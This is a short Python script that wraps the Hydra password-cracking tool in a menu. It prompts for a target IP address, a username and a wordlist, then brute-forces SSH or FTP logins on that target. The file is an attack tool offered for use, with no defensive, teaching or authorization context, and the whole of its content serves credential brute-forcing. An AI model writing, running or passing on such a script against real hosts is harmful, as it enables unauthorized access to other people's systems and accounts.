#!/usr/bin/env python
# -*- coding: utf-8 -*-

from termcolor import colored
import hashlib
from time import sleep
import subprocess as s
from datetime import datetime

class bruteforce:

    @staticmethod
    def get_input(prompt, err_msg="[-] Invalid Input"):
        try:
            return input(prompt)
        except (ValueError, KeyboardInterrupt):
            print(colored(f"\n{err_msg}", "red", attrs=['bold']))
            return None
        
    @staticmethod
    def clear():
        s.run("clear", shell=True)

    @staticmethod
    def crack():

        bruteforce.clear()
        date = colored(datetime.today().strftime('%Y-%m-%d %H:%M'), "red", attrs=['bold'])
        

        print(f"""
=====================================
        Hydra BruteForce Tool
=====================================
{date}
{"-"*16}
1- Hydra SSH BruteForce {colored("[+] Username is required", "green", attrs=['bold'])}
2- Hydra FTP BruteForce {colored("[+] Username is required", "green", attrs=['bold'])}
0- Exit
    """)
        
        choice_input = bruteforce.get_input("Enter Process ID => ")
        if choice_input is None:
            return
        
        try:
            choice = int(choice_input)
        except ValueError:
            print(colored("[-] Please Enter A Valid Number", "red", attrs=['bold']))
            return

        if choice == 0:
            print(colored("Thanks For Using...", "green", attrs=['bold']))
            sleep(0.5)
            
        if choice == 1:
            
            ip = bruteforce.get_input("Enter Target IP address : ")
            if not ip:
                return None

            username = bruteforce.get_input("Enter Username : ")
            if not username:
                return None
            
            wordlist = bruteforce.get_input("Enter Wordlist : ")
            if not wordlist:
                return None
            
            bruteforce.clear()
            s.run(["hydra", "-l", username, "-P", wordlist, f"ssh://{ip}", "-V" ])
        
        if choice == 2:

            ip = bruteforce.get_input("Enter Target IP Address : ")
            if not ip:
                return
            username = bruteforce.get_input("Enter Username : ")
            if not username:
                return
            wordlist = bruteforce.get_input("Enter Wordlist Path : ")
            if not wordlist:
                return
            
            bruteforce.clear()
            s.run(["hydra", "-l", username, "-P", wordlist, f"ftp://{ip}", "-V" ])